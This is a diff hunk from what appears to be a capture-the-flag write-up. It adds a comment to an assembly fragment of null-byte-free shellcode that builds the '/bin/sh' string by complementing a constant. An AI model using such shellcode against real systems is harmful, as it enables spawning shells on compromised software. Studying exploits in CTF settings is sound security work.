@@ -51,6 +51,7 @@ I solved this challenge by injecting shellcode in both nodes, and jumping betwee
 We have to keep in mind that fgets stops when it sees a \x00, so our shellcode can't have any of those.
 
 ```assembly
+   ; complement of "/bin/sh\x00"
    mov rbx, 0xff978cd091969dd0
    not rbx
    jmp short $+20
